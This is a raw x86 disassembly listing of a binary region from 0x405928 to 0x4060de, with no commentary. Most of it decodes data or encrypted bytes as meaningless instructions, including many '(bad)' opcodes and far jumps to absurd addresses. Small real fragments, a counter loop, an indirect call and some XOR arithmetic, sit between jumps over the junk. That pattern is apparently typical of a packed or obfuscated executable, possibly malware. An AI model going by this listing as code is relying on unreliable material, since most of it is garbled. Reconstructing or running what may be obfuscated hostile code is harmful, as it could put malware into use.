  405928:	ror    BYTE PTR [ecx+0x52cfbbf1],cl
  40592e:	ins    BYTE PTR es:[edi],dx
  40592f:	pop    edx
  405930:	fisubr WORD PTR [edi]
  405932:	mov    ah,0x7b
  405934:	pop    eax
  405935:	rcr    BYTE PTR [edi],cl
  405937:	fisub  DWORD PTR [esi+edi*4+0x7]
  40593b:	jmp    0xade2:0x95f6d5a1
  405942:	pop    ss
  405943:	repnz out dx,eax
  405945:	call   0xd7a0a9c7
  40594a:	add    ebp,edx
  40594c:	cli    
  40594d:	gs retf 0x5d91
  405951:	into   
  405952:	sbb    al,0x4e
  405954:	inc    ebx
  405955:	mov    bl,BYTE PTR [ebx+0x19b65ad]
  40595b:	sub    al,0x75
  40595d:	ror    DWORD PTR [ebx+0x2e2be9e],1
  405963:	jbe    0x4059c4
  405965:	pop    ss
  405966:	cld    
  405967:	nop
  405968:	xor    bl,BYTE PTR [ecx]
  40596a:	iret   
  40596b:	dec    edi
  40596c:	shr    DWORD PTR [ebp+ecx*4-0x5eff1177],cl
  405973:	and    eax,0xe67e45b0
  405978:	xor    ch,ah
  40597a:	adc    al,0x4
  40597c:	sbb    DWORD PTR [ebx+0x6edeefc1],ecx
  405982:	mov    ah,ch
  405984:	mov    esp,0x68217b16
  405989:	push   edx
  40598a:	dec    ebx
  40598b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40598c:	loopne 0x405932
  40598e:	out    dx,eax
  40598f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405990:	call   0x21dd628c
  405995:	shl    BYTE PTR [eax+0x12bc7b30],0x98
  40599c:	inc    edx
  40599d:	and    eax,0xc3a49af3
  4059a2:	es call 0xc15f573c
  4059a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a9:	jb     0x4059fd
  4059ab:	jg     0x405a17
  4059ad:	outs   dx,DWORD PTR ds:[esi]
  4059ae:	or     BYTE PTR [ecx-0x62c62055],dl
  4059b4:	ret    0x616b
  4059b7:	enter  0x2679,0x39
  4059bb:	sbb    dh,BYTE PTR ds:0x30d4a0de
  4059c1:	aam    0x14
  4059c3:	pop    esp
  4059c4:	add    al,0x7
  4059c6:	jb     0x4059b8
  4059c8:	or     al,0xf6
  4059ca:	ss mov cl,0xc6
  4059cd:	popf   
  4059ce:	dec    ecx
  4059cf:	test   eax,0x6bc9f872
  4059d4:	jnp    0x40599a
  4059d6:	cld    
  4059d7:	push   es
  4059d8:	(bad)  
  4059da:	jecxz  0x4059ab
  4059dc:	ins    BYTE PTR es:[edi],dx
  4059dd:	mov    cl,0xc4
  4059df:	idiv   BYTE PTR [esi-0x7b]
  4059e2:	xchg   DWORD PTR [eax],eax
  4059e4:	cmp    BYTE PTR [edx+eiz*2+0x32],al
  4059e8:	xor    BYTE PTR [eax+0x42],ch
  4059eb:	pusha  
  4059ec:	dec    eax
  4059ed:	sbb    DWORD PTR [edx+0x55],edx
  4059f0:	xchg   edx,eax
  4059f1:	xchg   edi,eax
  4059f2:	inc    edx
  4059f3:	pop    edi
  4059f4:	call   0x7d35a429
  4059f9:	mov    ecx,0x7113017c
  4059fe:	cmp    eax,0xf77cf319
  405a03:	sbb    ch,BYTE PTR [ebx-0x50]
  405a06:	or     esp,DWORD PTR [bp+si+0x8]
  405a0a:	xchg   ecx,eax
  405a0b:	pop    ecx
  405a0c:	popa   
  405a0d:	adc    BYTE PTR [esi+0x10],dl
  405a10:	aam    0xe6
  405a12:	ror    DWORD PTR [edx+ebx*8],1
  405a15:	mov    ch,0x45
  405a17:	cmc    
  405a18:	push   ebx
  405a19:	mov    ds:0x4b43e9bd,eax
  405a1e:	stc    
  405a1f:	shl    BYTE PTR [ebp+edi*2-0x679dbb4f],0x47
  405a27:	test   al,0x26
  405a29:	mov    ah,0x27
  405a2b:	bound  ecx,QWORD PTR [ebx]
  405a2d:	pop    ebx
  405a2e:	int3   
  405a2f:	(bad)  
  405a30:	mov    esi,0xfc45c796
  405a35:	xor    al,0x85
  405a37:	pushf  
  405a38:	clc    
  405a39:	and    DWORD PTR ds:0x43365b,edx
  405a3f:	mov    eax,DWORD PTR [ebp-0x4]
  405a42:	mov    edx,DWORD PTR ds:0x43376f
  405a48:	xor    DWORD PTR ds:0x433643,edx
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x433767,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x43363f,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43371b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43371b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43371b,ecx
  405a80:	cmp    DWORD PTR ds:0x43371b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43371b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x43367b
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x433757,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0x994d28f4,0x464852ff
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405a83
  405add:	push   es
  405ade:	neg    DWORD PTR [eax]
  405ae0:	fimul  DWORD PTR [edx-0x70878fc9]
  405ae6:	xor    ebx,DWORD PTR [ecx+ebx*4-0x3a]
  405aea:	ret    
  405aeb:	push   es
  405aec:	xlat   BYTE PTR ds:[ebx]
  405aed:	adc    al,0xe8
  405aef:	jae    0x405b49
  405af1:	and    ch,BYTE PTR ds:0x4b2f309f
  405af7:	jge    0x405b17
  405af9:	xchg   ebp,eax
  405afa:	fnsave [esi+0x77]
  405afd:	call   0xf2bc71f1
  405b02:	sti    
  405b03:	inc    edi
  405b04:	mov    BYTE PTR [eax],0x9f
  405b07:	add    al,BYTE PTR fs:[edi]
  405b0a:	ins    DWORD PTR es:[edi],dx
  405b0b:	stos   BYTE PTR es:[edi],al
  405b0c:	test   al,0xb
  405b0e:	sbb    ah,BYTE PTR [esi]
  405b10:	popa   
  405b11:	push   0x74
  405b13:	push   esi
  405b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b15:	push   0xac3a474c
  405b1a:	scas   eax,DWORD PTR es:[edi]
  405b1b:	pop    edx
  405b1c:	inc    esp
  405b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b1e:	rol    BYTE PTR [eax],cl
  405b20:	pop    ebx
  405b21:	imul   ecx,ecx,0x43e04990
  405b27:	jge    0x405b6f
  405b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b2a:	rcr    BYTE PTR [ebx],cl
  405b2c:	in     al,0xfb
  405b2e:	and    eax,0x26449435
  405b33:	cmp    al,0xc3
  405b35:	xchg   esp,eax
  405b36:	aaa    
  405b37:	xchg   BYTE PTR [edx],ah
  405b39:	push   es
  405b3a:	add    BYTE PTR [ebx],ch
  405b3c:	shr    BYTE PTR [edi+ebp*4+0x5c],1
  405b40:	push   0x8a52a35c
  405b45:	sub    eax,0x7ca3c77f
  405b4a:	jg     0x405b6d
  405b4c:	dec    esi
  405b4d:	xchg   esp,eax
  405b4e:	daa    
  405b4f:	inc    esi
  405b50:	push   esi
  405b51:	ins    DWORD PTR es:[edi],dx
  405b52:	in     eax,0xfd
  405b54:	sub    BYTE PTR [edx-0x57],0x62
  405b58:	dec    eax
  405b59:	mov    cl,0xf1
  405b5b:	adc    DWORD PTR [edx+eiz*4+0x27],ecx
  405b5f:	xchg   BYTE PTR [ecx+0x1a],bh
  405b62:	add    eax,0x66097d04
  405b67:	lods   al,BYTE PTR ds:[esi]
  405b68:	ret    
  405b69:	xor    al,0xc5
  405b6b:	shr    DWORD PTR ds:0x7e0d1ad5,0x52
  405b72:	pop    eax
  405b73:	pop    ds
  405b74:	out    dx,eax
  405b75:	test   al,0xec
  405b77:	es ss add al,0xc9
  405b7b:	inc    ecx
  405b7c:	inc    esi
  405b7d:	jp     0x405b99
  405b7f:	pop    ecx
  405b80:	and    DWORD PTR [eax-0x7234d184],eax
  405b86:	into   
  405b87:	or     cl,ah
  405b89:	addr16 sub al,0xfa
  405b8c:	sbb    DWORD PTR [ebp+eax*8-0x58],edi
  405b90:	push   ss
  405b91:	fidivr DWORD PTR [edi]
  405b93:	jnp    0x405b4e
  405b95:	pushf  
  405b96:	jge    0x405b32
  405b98:	add    ebx,ebp
  405b9a:	xchg   ebp,eax
  405b9b:	int3   
  405b9c:	mov    ds:0xe990a44c,al
  405ba1:	mov    bh,0xef
  405ba3:	iret   
  405ba4:	mov    ebx,ebx
  405ba6:	je     0x405bf6
  405ba8:	inc    ebx
  405ba9:	sub    cl,bh
  405bab:	ror    BYTE PTR [ecx],cl
  405bad:	arpl   WORD PTR [edx],ax
  405baf:	sbb    BYTE PTR [edi+0x3d],bl
  405bb2:	pop    eax
  405bb3:	add    esp,esi
  405bb5:	pop    ss
  405bb6:	test   DWORD PTR [ebp+0x65],edx
  405bb9:	pop    ds
  405bba:	in     al,0x26
  405bbc:	fld    DWORD PTR [edi-0x10f1e275]
  405bc2:	or     DWORD PTR [eax+0x69ae5c2b],esi
  405bc8:	dec    eax
  405bc9:	sbb    al,0xcf
  405bcb:	popa   
  405bcc:	xchg   esp,eax
  405bcd:	pop    ss
  405bce:	arpl   WORD PTR [ebp+0x3d],ax
  405bd1:	xor    al,0xf5
  405bd3:	in     eax,dx
  405bd4:	cld    
  405bd5:	pusha  
  405bd6:	das    
  405bd7:	cmp    eax,0xb9b7d573
  405bdc:	inc    ebp
  405bdd:	mov    ds:0x88a80750,eax
  405be2:	outs   dx,DWORD PTR ds:[esi]
  405be3:	div    al
  405be5:	ret    
  405be6:	xchg   ebp,eax
  405be7:	call   0xb734:0x8c3709f8
  405bee:	or     ebp,ebx
  405bf0:	cmp    bh,BYTE PTR [ebp-0x46afaef5]
  405bf6:	jmp    0x405c3e
  405bf8:	push   0x177dced5
  405bfd:	(bad)  
  405bfe:	outs   dx,DWORD PTR ds:[esi]
  405bff:	mov    al,0x8f
  405c01:	jp     0x405bdd
  405c03:	into   
  405c04:	jecxz  0x405bfc
  405c06:	adc    DWORD PTR ss:[bx+di-0x76],edx
  405c0b:	mov    ds:0x90d9ec8d,eax
  405c10:	out    0x7e,eax
  405c12:	movq   mm2,QWORD PTR cs:[edx+0x796b0b0d]
  405c1a:	sar    DWORD PTR [esp+ebp*8-0x1ec2e593],1
  405c21:	cmp    BYTE PTR [esi],cl
  405c23:	mov    edi,0xeb7f2e43
  405c28:	loopne 0x405c9f
  405c2a:	xchg   DWORD PTR [edi+0x2b2bcba],edi
  405c30:	test   BYTE PTR [ebx-0x5032d793],bl
  405c36:	int3   
  405c37:	aam    0x8a
  405c39:	jb     0x405bc4
  405c3b:	ret    
  405c3c:	xchg   edx,eax
  405c3d:	ja     0x405c38
  405c3f:	outs   dx,BYTE PTR ds:[esi]
  405c40:	mov    BYTE PTR [edx+0x72],0xde
  405c44:	pop    ds
  405c45:	int    0xf9
  405c47:	test   BYTE PTR [ecx+0x28ac0015],ch
  405c4d:	int    0xe3
  405c4f:	xor    DWORD PTR [ecx+ebx*1],edx
  405c52:	lods   eax,DWORD PTR ds:[esi]
  405c53:	popf   
  405c54:	dec    eax
  405c55:	stos   BYTE PTR es:[edi],al
  405c56:	dec    ecx
  405c57:	sbb    al,0x58
  405c59:	inc    eax
  405c5a:	aad    0x7c
  405c5c:	jbe    0x405c61
  405c5e:	ret    
  405c5f:	aaa    
  405c60:	xlat   BYTE PTR ds:[ebx]
  405c61:	jbe    0x405c40
  405c63:	sahf   
  405c64:	sahf   
  405c65:	lods   eax,DWORD PTR ds:[esi]
  405c66:	retf   
  405c67:	(bad)  
  405c68:	fmul   st,st(1)
  405c6a:	test   BYTE PTR [eax],0x6e
  405c6d:	xor    ch,BYTE PTR [esi]
  405c6f:	inc    eax
  405c70:	cmc    
  405c71:	fldcw  WORD PTR [esi+edx*1]
  405c74:	jecxz  0x405bfe
  405c76:	sbb    DWORD PTR [esi+0x5c680c0e],0xffffffaf
  405c7d:	jb     0x405c20
  405c7f:	and    bh,BYTE PTR [esi-0x6ed6fe2b]
  405c85:	in     al,dx
  405c86:	enter  0x62f6,0x0
  405c8a:	mov    edi,0x349ad934
  405c8f:	fwait
  405c90:	dec    ebp
  405c91:	rcr    BYTE PTR [edx],1
  405c93:	mov    ds:0x4c15ad8b,eax
  405c98:	fst    DWORD PTR [ebp+0x27]
  405c9b:	gs sbb al,0x76
  405c9e:	dec    edx
  405c9f:	(bad)  
  405ca0:	mov    ss,WORD PTR [esi-0x28]
  405ca3:	scas   eax,DWORD PTR es:[edi]
  405ca4:	sbb    eax,ebp
  405ca6:	mov    eax,ds:0x863c7069
  405cab:	aaa    
  405cac:	and    BYTE PTR [eax],0xbb
  405caf:	clc    
  405cb0:	stos   BYTE PTR es:[edi],al
  405cb1:	xor    BYTE PTR [ebp+0x42],dh
  405cb4:	sub    eax,0xdf83a34d
  405cb9:	sub    DWORD PTR [edx-0x59348a0a],esi
  405cbf:	dec    esp
  405cc0:	sbb    BYTE PTR [eax+0x13],ch
  405cc3:	sub    al,0x7a
  405cc5:	int3   
  405cc6:	jne    0x405d24
  405cc8:	mov    dl,0xcc
  405cca:	dec    eax
  405ccb:	mov    eax,0x538f2a84
  405cd0:	(bad)  
  405cd1:	cmp    cl,bl
  405cd3:	pop    ss
  405cd4:	sub    esp,DWORD PTR [edx+0x2f]
  405cd7:	and    eax,0x4084d7d7
  405cdc:	adc    al,0xc2
  405cde:	test   eax,0x5306ba15
  405ce3:	adc    al,0xb8
  405ce5:	repnz xchg edi,eax
  405ce7:	out    dx,al
  405ce8:	xchg   ebp,eax
  405ce9:	jmp    0xb6fa947f
  405cee:	psubsb mm0,QWORD PTR [ebx]
  405cf1:	add    DWORD PTR [ebx+0x2091e538],esp
  405cf7:	ins    DWORD PTR es:[edi],dx
  405cf8:	fcmovb st,st(4)
  405cfa:	shl    edx,cl
  405cfc:	ja     0x405d29
  405cfe:	mov    esi,0x2a4a023f
  405d03:	or     al,0x8
  405d05:	and    eax,0x5fec4c8
  405d0a:	arpl   dx,dx
  405d0c:	lds    eax,FWORD PTR [eax+ecx*4+0x29b9108e]
  405d13:	imul   BYTE PTR [edi]
  405d15:	mov    ecx,0xecf65236
  405d1a:	xchg   ebp,eax
  405d1b:	xor    BYTE PTR [edx+ebp*2+0x1b825271],ah
  405d22:	out    dx,al
  405d23:	outs   dx,BYTE PTR ds:[esi]
  405d24:	adc    dl,BYTE PTR [ecx+0x11]
  405d27:	or     BYTE PTR [edi-0x755425e7],dl
  405d2d:	aam    0xc5
  405d2f:	dec    al
  405d31:	in     al,0x2d
  405d33:	les    ebx,FWORD PTR [edx+0x6237631b]
  405d39:	pop    ecx
  405d3a:	mov    ds:0x7dc871e3,al
  405d3f:	sahf   
  405d40:	shr    DWORD PTR [eax+0x83a2ead],0x65
  405d47:	adc    DWORD PTR [ebx],esi
  405d49:	clc    
  405d4a:	bswap  edx
  405d4c:	sub    BYTE PTR [esi],al
  405d4e:	dec    esi
  405d4f:	cmp    DWORD PTR [esi-0x74dcdc0a],ecx
  405d55:	aas    
  405d56:	adc    BYTE PTR [edx],al
  405d58:	fdiv   st(4),st
  405d5a:	scas   al,BYTE PTR es:[edi]
  405d5b:	inc    edx
  405d5c:	shl    cl,cl
  405d5e:	int3   
  405d5f:	scas   eax,DWORD PTR es:[edi]
  405d60:	adc    BYTE PTR [ecx],0xfb
  405d63:	push   esp
  405d64:	stc    
  405d65:	in     al,dx
  405d66:	pop    esp
  405d67:	cmp    dl,BYTE PTR [eax-0x39]
  405d6a:	pop    eax
  405d6b:	mov    al,0x63
  405d6d:	shl    DWORD PTR [ebx+0x5f12a8a9],0x9
  405d74:	loop   0x405d23
  405d76:	add    bl,cl
  405d78:	mov    al,ds:0x47c1dbf6
  405d7d:	ss nop
  405d7f:	xor    BYTE PTR [esi+esi*2-0x51],ah
  405d83:	add    dh,al
  405d85:	ins    DWORD PTR es:[edi],dx
  405d86:	in     eax,dx
  405d87:	dec    ebx
  405d88:	das    
  405d89:	push   es
  405d8a:	pop    ds
  405d8b:	pop    ebp
  405d8c:	jo     0x405d3b
  405d8e:	das    
  405d8f:	xchg   edx,eax
  405d90:	ror    esi,1
  405d92:	inc    ebx
  405d93:	jo     0x405d8f
  405d95:	pop    eax
  405d96:	imul   edi,DWORD PTR [edx+0x20],0xc4b3a4fd
  405d9d:	fcom   DWORD PTR [esi-0x7ff430b8]
  405da3:	xlat   BYTE PTR ds:[ebx]
  405da4:	add    BYTE PTR [ebx],0x3f
  405da7:	fadd   DWORD PTR [ebp+0x1c]
  405daa:	ins    DWORD PTR es:[edi],dx
  405dab:	push   es
  405dac:	leave  
  405dad:	(bad)  
  405dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405daf:	xor    ah,BYTE PTR [eax+0x4a]
  405db2:	pop    ss
  405db3:	outs   dx,BYTE PTR ds:[esi]
  405db4:	jbe    0x405d86
  405db6:	add    BYTE PTR [esi+0x6c25848a],ch
  405dbc:	loope  0x405dea
  405dbe:	xchg   esi,eax
  405dbf:	xor    eax,ebp
  405dc1:	mov    bl,0x8d
  405dc3:	sti    
  405dc4:	pusha  
  405dc5:	inc    esi
  405dc6:	xor    DWORD PTR [ebp-0x5e],eax
  405dc9:	js     0x405e28
  405dcb:	xchg   ecx,eax
  405dcc:	pop    fs
  405dce:	mov    cl,ah
  405dd0:	call   0x9476a1c6
  405dd5:	(bad)  
  405dd6:	fisubr WORD PTR [ecx+eiz*1+0x2b]
  405dda:	pop    esp
  405ddb:	int    0x7f
  405ddd:	ins    DWORD PTR es:[edi],dx
  405dde:	test   DWORD PTR [ebx+0x7c],ebp
  405de1:	fdivr  st(0),st
  405de3:	inc    ecx
  405de4:	mov    esp,0x63fef859
  405de9:	dec    esi
  405dea:	mov    ebp,0xb9db7df4
  405def:	sti    
  405df0:	xlat   BYTE PTR ds:[ebx]
  405df1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  405df3:	cli    
  405df4:	xchg   edi,eax
  405df5:	loop   0x405e5a
  405df7:	sbb    bh,dh
  405df9:	sar    BYTE PTR [eax+0x1e706e01],0xf9
  405e00:	and    DWORD PTR [ecx+ecx*4-0x78],esp
  405e04:	call   0x9590daea
  405e09:	jmp    0xee3f9a77
  405e0e:	outs   dx,BYTE PTR ds:[esi]
  405e0f:	adc    eax,0x2de04420
  405e14:	stos   DWORD PTR es:[edi],eax
  405e15:	stos   DWORD PTR es:[edi],eax
  405e16:	outs   dx,BYTE PTR ds:[esi]
  405e17:	sahf   
  405e18:	xchg   DWORD PTR [eax],edx
  405e1a:	hlt    
  405e1b:	sbb    ecx,DWORD PTR [ebx-0x1b20371f]
  405e21:	xor    ah,BYTE PTR [edi]
  405e23:	ficomp DWORD PTR [ebx+edx*2]
  405e26:	inc    eax
  405e27:	add    eax,0xe07a2165
  405e2c:	mov    cl,0x8b
  405e2e:	sub    BYTE PTR [ecx+0x7],dl
  405e31:	cwde   
  405e32:	mov    ebx,gs
  405e34:	sbb    al,0xd6
  405e36:	(bad)  
  405e37:	fnsave [ebp+0x16]
  405e3a:	adc    esi,DWORD PTR [edx+0x687ebd8a]
  405e40:	cmp    DWORD PTR [ebx+0x1592646],eax
  405e46:	sub    al,0xe6
  405e48:	cmp    BYTE PTR [ecx+0x49],bh
  405e4b:	pop    es
  405e4c:	dec    ebp
  405e4d:	mov    WORD PTR [eax-0x2e],ss
  405e50:	inc    edx
  405e51:	mov    eax,ds:0x9fe7e3ab
  405e56:	jmp    0x405e9f
  405e58:	dec    esp
  405e59:	xchg   ecx,eax
  405e5a:	jmp    0xf71a:0x4e5c84f0
  405e61:	and    bh,dh
  405e63:	mov    ah,0x95
  405e65:	outs   dx,BYTE PTR ds:[esi]
  405e66:	jb     0x405eb6
  405e68:	dec    eax
  405e69:	(bad)  
  405e6a:	mov    edx,0x48d55219
  405e6f:	cld    
  405e70:	leave  
  405e71:	stos   BYTE PTR es:[edi],al
  405e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e73:	ficomp WORD PTR [ecx+0x78a2aa1d]
  405e79:	addr16 push 0x2fd6cee3
  405e7f:	xchg   BYTE PTR [ebp-0x12],bl
  405e82:	mov    edi,0x8c52fc53
  405e87:	nop
  405e88:	jne    0x405e43
  405e8a:	mov    esp,0x8930f00c
  405e8f:	cmp    edx,eax
  405e91:	jbe    0x405e32
  405e93:	add    eax,ecx
  405e95:	imul   eax,esi
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0x3416d7e7
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	(bad)  
  405ee3:	push   edx
  405ee4:	retf   
  405ee5:	jnp    0x405ed6
  405ee7:	in     eax,dx
  405ee8:	call   0x1add:0x7d9df41f
  405eef:	lds    edx,FWORD PTR [ebx]
  405ef1:	lds    ebp,FWORD PTR [esi-0x40397ced]
  405ef7:	mov    bl,0x25
  405ef9:	push   eax
  405efa:	hlt    
  405efb:	jns    0x405ef8
  405efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405efe:	es dec ebp
  405f00:	mov    ch,0x1b
  405f02:	sbb    DWORD PTR ds:0x535fc93f,edx
  405f08:	leave  
  405f09:	or     BYTE PTR [ebx-0x75],0xcd
  405f0d:	sub    BYTE PTR [eax+edi*2-0x49],dh
  405f11:	outs   dx,BYTE PTR ds:[esi]
  405f12:	out    dx,al
  405f13:	inc    DWORD PTR ds:0x7e296c1e
  405f19:	inc    bh
  405f1b:	sbb    ah,ch
  405f1d:	xlat   BYTE PTR ds:[ebx]
  405f1e:	data16 in al,dx
  405f20:	sub    ah,BYTE PTR [eax+0x44]
  405f23:	retf   
  405f24:	fcomp  DWORD PTR [edx]
  405f26:	fwait
  405f27:	test   BYTE PTR [eax+0x1b224bb],ch
  405f2d:	jns    0x405f19
  405f2f:	and    eax,0x4a7491ff
  405f34:	sub    ch,BYTE PTR [ebx+0x30]
  405f37:	jge    0x405f31
  405f39:	lods   al,BYTE PTR ds:[esi]
  405f3a:	test   eax,0x7920c2e6
  405f3f:	mov    eax,ds:0x167e3a37
  405f44:	add    BYTE PTR [ebp+0x33046ebe],bh
  405f4a:	xchg   ebx,eax
  405f4b:	push   esi
  405f4c:	in     al,dx
  405f4d:	loope  0x405f3f
  405f4f:	jp     0x405efe
  405f51:	cmp    ebp,esp
  405f53:	mov    dh,0xfc
  405f55:	out    0x5e,eax
  405f57:	cli    
  405f58:	xor    dh,0x82
  405f5b:	in     al,0xad
  405f5d:	sub    al,BYTE PTR [esi-0x15]
  405f60:	mov    eax,ds:0xa423e619
  405f65:	push   0x711bf4fa
  405f6a:	(bad)  
  405f6b:	xchg   esi,eax
  405f6c:	pop    ebx
  405f6d:	fsubr  DWORD PTR [ecx]
  405f6f:	xchg   esp,eax
  405f70:	out    dx,eax
  405f71:	stc    
  405f72:	mov    esi,0xa89291a8
  405f77:	mov    ah,0x1c
  405f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f7a:	sti    
  405f7b:	xchg   BYTE PTR ds:0xfbf724ad,ah
  405f81:	or     dh,bh
  405f83:	dec    ebx
  405f84:	mov    eax,0x4030f3f8
  405f89:	mov    eax,ds:0x98a1bc19
  405f8e:	stos   DWORD PTR es:[edi],eax
  405f8f:	daa    
  405f90:	sbb    eax,0x2b6b6bb7
  405f95:	cld    
  405f96:	mov    al,ds:0x117606ce
  405f9b:	enter  0xf14f,0xd
  405f9f:	mov    dh,0xe6
  405fa1:	sub    ebx,ebp
  405fa3:	loopne 0x405fb0
  405fa5:	inc    eax
  405fa6:	cld    
  405fa7:	sbb    ebp,DWORD PTR [edi-0x884f48b]
  405fad:	cmp    DWORD PTR [ecx-0x35c2958a],ecx
  405fb3:	pop    ebp
  405fb4:	cwde   
  405fb5:	adc    BYTE PTR [ebp-0x23],ah
  405fb8:	scas   al,BYTE PTR es:[edi]
  405fb9:	inc    ecx
  405fba:	std    
  405fbb:	xchg   ecx,eax
  405fbc:	stos   DWORD PTR es:[edi],eax
  405fbd:	mov    bh,0xf3
  405fbf:	jne    0x405fee
  405fc1:	(bad)  
  405fc2:	(bad)  
  405fc3:	mov    ebp,0x5877ac7d
  405fc8:	ja     0x405fcc
  405fca:	cmp    dl,BYTE PTR [edx+ecx*2+0x40c183bb]
  405fd1:	adc    edx,DWORD PTR ss:[ebx+0x45]
  405fd5:	or     ebx,DWORD PTR [edi+0x43]
  405fd8:	hlt    
  405fd9:	lock xor BYTE PTR [eax],dl
  405fdc:	cli    
  405fdd:	lock mov ebp,0x547ec6e2
  405fe3:	mov    edi,0xf516f8e6
  405fe8:	cmp    al,0x1b
  405fea:	lahf   
  405feb:	test   eax,0xb2d15b9a
  405ff0:	xor    eax,0x1d81f6b8
  405ff5:	pop    ebx
  405ff6:	pop    esi
  405ff7:	test   BYTE PTR [esi-0x4806b71c],ah
  405ffd:	mov    esp,0xb78c2ac4
  406002:	cmp    eax,0x25d214e
  406007:	jle    0x406062
  406009:	jns    0x405fea
  40600b:	mul    dh
  40600d:	(bad)  
  40600e:	mov    BYTE PTR [ebp+0x18723929],al
  406014:	in     al,0x70
  406016:	fwait
  406017:	(bad)  
  406018:	xor    bl,BYTE PTR [ecx-0x35aab4b6]
  40601e:	hlt    
  40601f:	xchg   ecx,eax
  406020:	leave  
  406021:	aas    
  406022:	imul   edi,DWORD PTR [eax+0x41],0x6da963cf
  406029:	adc    bl,dh
  40602b:	sbb    ebx,edi
  40602d:	test   cl,bl
  40602f:	inc    esp
  406030:	arpl   WORD PTR [ebx-0x40],ax
  406033:	push   ebp
  406034:	sub    eax,0x9fb56500
  406039:	daa    
  40603a:	sub    eax,DWORD PTR [eax-0x74]
  40603d:	fld    QWORD PTR [ebp+esi*4+0x4f]
  406041:	mov    ecx,?
  406043:	sbb    BYTE PTR [esi+0x28ac5d5d],dl
  406049:	adc    BYTE PTR [ebp+0x2e],cl
  40604c:	ss push eax
  40604e:	mov    al,0x8b
  406050:	fstp   TBYTE PTR [edx+eiz*8+0x59]
  406054:	mov    bl,0xde
  406056:	mov    edx,0x201dd750
  40605b:	pop    edx
  40605c:	(bad)  
  40605d:	adc    eax,0x7e28bbdf
  406062:	mov    eax,0xdee2c718
  406067:	cmp    eax,0x718feac0
  40606c:	mov    bh,0xd4
  40606e:	int3   
  40606f:	mov    al,0xb5
  406071:	mov    dh,0x7e
  406073:	sahf   
  406074:	test   al,0x1a
  406076:	fcmovu st,st(4)
  406078:	ins    DWORD PTR es:[edi],dx
  406079:	loopne 0x40601b
  40607b:	cmp    bl,BYTE PTR [ebx+0x3c]
  40607e:	(bad)  [ebx+0x13]
  406081:	push   es
  406082:	dec    ecx
  406083:	retf   
  406084:	adc    cl,BYTE PTR [edx+0x342458bd]
  40608a:	rol    BYTE PTR [ebx],1
  40608c:	pop    ds
  40608d:	cld    
  40608e:	pop    esp
  40608f:	push   esi
  406090:	mov    DWORD PTR [esi+edi*8],ecx
  406093:	les    ebp,FWORD PTR [eax]
  406095:	jmp    0x406071
  406097:	mov    ds:0x2a379cb6,al
  40609c:	cdq    
  40609d:	test   eax,0x3e89477a
  4060a2:	fsub   st,st(7)
  4060a4:	xlat   BYTE PTR ds:[ebx]
  4060a5:	and    ch,BYTE PTR [ecx+0x58]
  4060a8:	jae    0x406108
  4060aa:	mov    ebp,0x8c1ce142
  4060af:	dec    esp
  4060b0:	cs cli 
  4060b2:	sbb    edx,DWORD PTR [esi+0x75]
  4060b5:	cmp    eax,0x8de4e6f6
  4060ba:	in     eax,0x75
  4060bc:	inc    ecx
  4060bd:	pushf  
  4060be:	inc    eax
  4060bf:	sub    ebx,esp
  4060c1:	mov    al,0x2c
  4060c3:	sahf   
  4060c4:	add    al,0x99
  4060c6:	outs   dx,WORD PTR ds:[esi]
  4060c8:	cld    
  4060c9:	idiv   DWORD PTR [edx+esi*1]
  4060cc:	test   BYTE PTR [ebp-0xf98433f],dl
  4060d2:	jp     0x406071
  4060d4:	add    eax,0x2d1e45db
  4060d9:	mov    ebp,0xd904888b
  4060de:	fsubp  st(5),st
